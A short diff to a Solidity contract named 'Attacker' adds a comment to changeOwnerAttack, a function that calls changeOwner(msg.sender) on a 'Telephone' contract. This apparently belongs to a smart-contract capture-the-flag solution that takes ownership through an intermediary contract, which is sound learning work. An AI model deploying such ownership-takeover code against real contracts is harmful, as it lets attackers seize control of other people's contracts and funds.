@@ -11,6 +11,7 @@ contract Attacker {
         itelephone = ITelephone(_telephone);
     }
 
+    // Call the interface to change the owner for msg.sender
     function changeOwnerAttack() public {
         itelephone.changeOwner(msg.sender);
     }
